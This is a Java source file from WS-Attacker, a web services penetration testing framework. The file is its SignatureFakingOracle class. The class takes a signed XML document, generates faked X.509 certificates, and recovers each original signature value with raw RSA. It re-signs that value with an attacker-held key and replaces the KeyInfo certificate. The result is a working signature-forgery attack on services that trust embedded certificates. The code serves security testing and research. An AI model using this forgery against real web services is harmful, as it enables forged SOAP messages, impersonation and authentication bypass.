/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Juraj Somorovsky
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package wsattacker.library.signatureFaking;

import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.Security;
import java.util.LinkedList;
import java.util.List;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import org.apache.commons.codec.binary.Base64;
import org.apache.log4j.Logger;
import org.bouncycastle.jce.provider.BouncyCastleProvider;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;
import wsattacker.library.signatureFaking.exceptions.CertificateHandlerException;
import wsattacker.library.signatureFaking.exceptions.SignatureFakingException;
import wsattacker.library.signatureFaking.helper.CertificateHandler;
import wsattacker.library.signatureWrapping.util.dom.DomUtilities;
import wsattacker.library.signatureWrapping.util.signature.NamespaceConstants;

/**
 * Creates faked signatures by issuing a new certificate and resigning
 * the original signature value
 *
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 * @version 0.1
 */
public class SignatureFakingOracle {

    private Document doc;
    private List<Node> signatureValueElements;
    private List<Node> keyInfoElements;
    private List<String> certificates;
    private List<CertificateHandler> certHandlers;
    private Logger log = Logger.getLogger(SignatureFakingOracle.class);

    /**
     * Creates SignatureWrappingOracle, parses the document and searches
     * for all the SignatureValue and KeyInfo elements
     * 
     * @param documentString
     * @throws SignatureFakingException 
     */
    public SignatureFakingOracle(final String documentString) throws
            SignatureFakingException {
        Security.addProvider(new BouncyCastleProvider());
        signatureValueElements = new LinkedList<Node>();
        keyInfoElements = new LinkedList<Node>();
        certificates = new LinkedList<String>();
        certHandlers = new LinkedList<CertificateHandler>();
        try {
            doc = DomUtilities.stringToDom(documentString);
            crawlSignatureElements();
            log.debug("found " + signatureValueElements.size() + 
                    " SignatureValue elements");
            crawlKeyInfoElements();
            log.debug("found " + keyInfoElements.size() + 
                    " KeyInfo elements containing X509 certificates");
        } catch (SAXException e) {
            throw new SignatureFakingException(e);
        }
    }

    /**
     * Creates fake signatures
     * 
     * @throws SignatureFakingException 
     */
    public void fakeSignatures() throws SignatureFakingException {
        try {
            createFakedCertificates();
            for (int i = 0; i < signatureValueElements.size(); i++) {
                fakeSignature(i);
            }

        } catch (CertificateHandlerException e) {
            throw new SignatureFakingException(e);
        }
    }

    
    public void fakeSignature(int i) throws CertificateHandlerException,
            SignatureFakingException {
        if(signatureValueElements.size() != certHandlers.size()) {
            createFakedCertificates();
        }
        String signature = signatureValueElements.get(i).getTextContent();
        CertificateHandler ch = certHandlers.get(i);
        byte[] newSignature = resignValue(Base64.
                decodeBase64(signature), ch);
        signatureValueElements.get(i).setTextContent(
                new String(Base64.encodeBase64(newSignature)));
        appendCertificate(keyInfoElements.get(i),
                ch.getFakedCertificateString());
    }

    private void createFakedCertificates() throws
            CertificateHandlerException {
               for (String cert : certificates) {
            CertificateHandler ch = new CertificateHandler(cert);
            ch.createFakedCertificate();
            certHandlers.add(ch);
        }
    }

    /**
     *
     * @return True if the signature contains public key information (X509
     * certificate in the KeyInfo element)
     */
    public boolean certificateProvided() {
        if (certificates.size() > 0) {
            return true;
        } else {
            return false;
        }
    }

    public void setCertificate(String cert) {
        certificates.clear();
        // we want to have so many certificates as many signature values
        for (int i = 0; i < signatureValueElements.size(); i++) {
            certificates.add(cert);
        }
    }

    /**
     * Crawls all the collected KeyInfo elements and extracts certificates
     */
    private void crawlKeyInfoElements() {
        for (Node ki : keyInfoElements) {
            List<Element> l = DomUtilities.findChildren(ki, "X509Certificate", 
                    NamespaceConstants.URI_NS_DS, true);
            if (l.size() > 0) {
                Node x509cert = l.get(0);
                if (x509cert != null && x509cert.getLocalName().equals("X509Certificate")) {
                    certificates.add(x509cert.getTextContent());
                }
            }
        }
    }

    private void crawlSignatureElements() throws SignatureFakingException {
        // TODO replace with DOMUtilities
        NodeList nl = getSignatureElements();
        for (int i = 0; i < nl.getLength(); i++) {
            Node n = nl.item(i);
            NodeList children = n.getChildNodes();
            for (int j = 0; j < children.getLength(); j++) {
                Node current = children.item(j);
                if (current.getNodeType() == Node.ELEMENT_NODE) {
                    if (current.getLocalName().equals("SignedInfo")) {
                        Element signatureMethod = DomUtilities.findChildren(
                                current, "SignatureMethod", NamespaceConstants.URI_NS_DS,
                                false).get(0);
                        if (signatureMethod != null
                                && (!isSignatureMethodSupported(signatureMethod))) {
                            throw new SignatureFakingException("Signature "
                                    + "Algorithm not yet supported");
                        }
                    } else if (current.getLocalName().equals("SignatureValue")) {
                        signatureValueElements.add(current);
                    } else if (current.getLocalName().equals("KeyInfo")) {
                        keyInfoElements.add(current);
                    }
                }
            }
        }
    }

    private boolean isSignatureMethodSupported(Node signatureMethodElement) {
        NamedNodeMap nl = signatureMethodElement.getAttributes();
        Node n = nl.getNamedItem("Algorithm");
        if (n != null) {
            String algorithm = n.getTextContent();
            if (algorithm.contains("rsa-sha")) {
                return true;
            }
        }
        return false;
    }

    private void appendCertificate(Node keyInfo, String certificate) {
        keyInfo.setTextContent("");
        String prefix = keyInfo.getPrefix();
        if(prefix == null ) {
            prefix = "";
        } else {
            prefix = prefix + ":";
        }
        Node data = keyInfo.getOwnerDocument().createElementNS(
                NamespaceConstants.URI_NS_DS,  prefix + "X509Data");
        keyInfo.appendChild(data);
        Node cert = keyInfo.getOwnerDocument().createElementNS(
                NamespaceConstants.URI_NS_DS, prefix + "X509Certificate");
        data.appendChild(cert);
        cert.setTextContent(certificate);
        log.debug("Appending Certificate \r\n" + certificate + "\r\nto the" +
                prefix + "X509Certificate element");
    }

    private byte[] resignValue(byte[] signatureValue, CertificateHandler ch)
            throws SignatureFakingException {
        PrivateKey privKey = ch.getFakedKeyPair().getPrivate();
        PublicKey pubKey = ch.getOriginalPublicKey();
        String alg = ch.getFakedCertificate().getSigAlgName();
        if (alg.contains("RSA")) {
            try {
                Cipher cipher = Cipher.getInstance("RSA/None/NoPadding");
                cipher.init(Cipher.ENCRYPT_MODE, pubKey);
                byte[] unsigend = cipher.doFinal(signatureValue);

                cipher = Cipher.getInstance("RSA/None/NoPadding");
                cipher.init(Cipher.DECRYPT_MODE, privKey);
                log.debug("New Signature value computed");
                return cipher.doFinal(unsigend);
            } catch (BadPaddingException e) {
                throw new SignatureFakingException(e);
            } catch (IllegalBlockSizeException e) {
                throw new SignatureFakingException(e);
            } catch (InvalidKeyException e) {
                throw new SignatureFakingException(e);
            } catch (NoSuchAlgorithmException e) {
                throw new SignatureFakingException(e);
            } catch (NoSuchPaddingException e) {
                throw new SignatureFakingException(e);
            }
        } else {
            return null;
        }
    }

    private NodeList getSignatureElements() {
        return doc.getElementsByTagNameNS(NamespaceConstants.URI_NS_DS, "Signature");
    }

    public List<String> getCertificates() {
        return certificates;
    }

    public String getDocument() {
        return DomUtilities.domToString(doc);
    }
}
